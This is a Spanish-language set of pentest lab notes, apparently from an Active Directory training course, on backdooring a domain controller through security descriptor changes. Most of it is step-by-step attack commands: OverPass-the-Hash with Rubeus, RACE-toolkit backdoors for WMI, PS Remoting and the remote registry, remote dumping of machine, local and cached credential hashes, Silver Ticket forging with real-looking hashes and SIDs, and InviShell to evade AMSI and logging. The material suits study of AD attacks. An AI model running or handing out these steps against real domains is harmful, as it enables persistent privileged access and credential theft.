# Security Descriptors using ACLs 

Tags: #AD #Windows #Powershell #ACL 

```bash 
- Es posible modificar los 'Security Descriptors' (información de seguridad como Owner, primary group, DACL y SACL) de múltiples métodos de acceso remoto (objetos securizables) para permitir acceso a usuarios no administradores.
- Se requieren privilegios administrativos para realizar esto.
- Evidentemente, funciona como un mecanismo de 'backdoor' muy útil y de alto impacto.
- El 'Security Descriptor Definition Language (SDDL)' define el formato utilizado para describir un security descriptor. SDDL utiliza cadenas 'ACE' para la DACL y la SACL:
	ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
	
- Ejemplo de ACE para administradores integrados en _namespaces_ de WMI:
	A;CI;CCDCLCSWRPWPRCWD;;;SID
```

## Hacer OPTH 

```powershell 
! Usuario: Domain Admin

Paso 1:
# Hacer OPTH con el usuario admin del server ejecutando el siguiente comando en una consola cmd en la máquina de atacante como administrador local la cual abrira una nueva consola con ese ticket y es ahi donde se ejecutan los siguientes comandos

❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
# Solicitar un TGT legítimo para el usuario "svcadmin" utilizando su clave AES256 mediante OverPass-the-Hash/OverPass-the-Key, creando una nueva sesión netonly con una CMD aislada e inyectando el ticket Kerberos en memoria para autenticarse como dicho usuario

Paso 2: 
❯ C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat     # Ejecutar powershell 
```

## WMI - Forma 1

```powershell 
! Usuario: Domain Admin
# Se ejecuta en la consola del OPTH 

Paso 3:
❯ . C:\AD\Tools\RACE.ps1
# Cargar el toolkit RACE para modificar ACLs y otorgar acceso a objetos protegidos a usuarios no administradores.

❯ Set-RemoteWMI -SamAccountName student1 -Verbose
# Otorgar permisos WMI remotos a un usuario en la máquina local.

❯ Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Verbose 
❯ Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Verbose -remove 

Paso 4:
❯ Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
# Otorgar permisos WMI remotos a un usuario en una máquina remota sin credenciales explícitas.

❯ Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose
# Otorgar permisos WMI remotos a un usuario en una máquina remota usando credenciales explícitas — aplica solo a root\cimv2 y namespaces anidados.

❯ Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose
# Revocar los permisos WMI remotos otorgados previamente a un usuario en una máquina remota.
```

```powershell 
! Usuario: Administrador local
# Desde una consola normal como student1 se pueden ejecutar comandos pero debe de ser desde una consola como administrador local 

❯ C:\AD\InviShell\RunWithPathAsAdmin.bat
# Cargar InviShell con privilegios de administrador — evade la transcripción, AMSI y logging de PowerShell.

Paso 5:
❯ gwmi -class win32_operatingsystem -ComputerName dcorp-dc
# Verificar conectividad y acceso WMI hacia un equipo remoto consultando información del sistema operativo.
```

## PowerShell Remoting

Una modificación similar puede realizarse en la configuración de PowerShell Remoting. (En casos poco frecuentes, es posible que obtengas un error de entrada/salida (I/O) al ejecutar el siguiente comando; si ocurre, puedes ignorarlo). Ten en cuenta que esta técnica es inestable debido a algunos parches publicados en agosto de 2020.

```powershell 
! Usuario: Domain Admin
# Se ejecuta en la consola del OPTH 

❯ . C:\AD\Tools\RACE.ps1
# Cargar el toolkit RACE para modificar ACLs y otorgar acceso a objetos protegidos a usuarios no administradores.

Paso 6:
❯ Set-RemotePSRemoting -SamAccountName studentx -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
# Otorgar permisos WMI remotos a un usuario en una máquina remota sin credenciales explícitas.

❯ Set-RemotePSRemoting -SamAccountName student1 -Verbose
# Otorgar permisos de PS Remoting a un usuario en la máquina local vía RACE toolkit — no estable después de los parches de agosto 2020.

❯ Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose
# Otorgar permisos de PS Remoting a un usuario en una máquina remota sin credenciales explícitas. Nota: Si sale un error I/O es normal y aun así se puede ingresar a la sesión 

❯ Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove
# Revocar los permisos de PS Remoting otorgados previamente a un usuario en una máquina remota.

Notas:
	1. Usar RACE toolkit - El PS Remoting backdoor no es estable desde los parches de agosto 2020
```

```powershell 
! Usuario de dominio con permisos de PS Remoting antes configurados en el paso 6
# Se ejecuta desde una consola con permisos de administrador local  

Paso 7:
❯ Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
# Ejecutar comandos remotamente mediante PowerShell Remoting (WinRM)

Paso 8:
❯ Enter-PSSession dcorp-dc     # Ingresar a la sesión 
	❯ $env:username 
	❯ whoami /all 
```

## Remote Registry

Para obtener el hash de la cuenta máquina sin privilegios de Domain Admin, primero necesitamos modificar permisos en el Domain Controller.

```powershell 
! Usuario: Domain Admin
# Se ejecuta en la consola del OPTH 

❯ . C:\AD\Tools\RACE.ps1
# Cargar el toolkit RACE para modificar ACLs y otorgar acceso a objetos protegidos a usuarios no administradores.

Paso 9: 
❯ Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose
# Agregar un backdoor en el registro remoto del DC para que un usuario sin privilegios pueda extraer hashes posteriormente vía RACE o DAMP

❯ Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
```

```powershell
! Usuario: Usuario de dominio con backdoor de registro configurado previamente en el paso 9

❯ C:\AD\Tools\RACE.ps1

Paso 10:
❯ Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
# Extraer el hash de la cuenta de máquina del DC de forma remota abusando del backdoor de registro.

❯ Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
# Extraer los hashes de cuentas locales del DC de forma remota abusando del backdoor de registro.

❯ Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
# Extraer credenciales cacheadas del DC de forma remota abusando del backdoor de registro.
```

## Generar Silver Ticket 

Podemos utilizar el hash de la cuenta máquina del Domain Controller (DCORP-DC$) para crear Silver Tickets para los servicios HOST y RPCSS, permitiéndonos autenticarnos contra WMI y ejecutar consultas remotas sin necesidad de contactar al KDC.

```powershell 
! Usuario normal del dominio 
# Ejecutar desde una consola con bajos privilegios 

Paso 11: 
# Depues de obtener el 'MachineAccountHash' en el paso 10 se hace lo siguiente:
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:03a5505546ae90b468cc243d54c859c9 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
# Crear e inyectar un Silver Ticket para el servicio HOST del Domain Controller utilizando el hash de la cuenta máquina, permitiendo autenticarse como Administrator ante dicho servicio sin necesidad de contactar al KDC

	# rc4 = MachineAccounthash 
	# sid = SID del dominio completo (dollarcorp.moneycorp.local)


Paso 12:
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:<MachineAccountHash> /sid:<DomainSID> /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
# Crear e inyectar un Silver Ticket para el servicio RPCSS del Domain Controller utilizando el hash de la cuenta máquina, permitiendo autenticarse como Administrator ante servicios RPC necesarios para operaciones remotas mediante WMI.

❯ klist     # Verificar los tickets agregados 
```

```powershell 
# En la misma consola de bajos privilegios (studentx) ejecutar los siguientes comandos
❯ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

Paso 13:
❯ gwmi -Class win32_operatingsystem -ComputerName dcorp-dc
```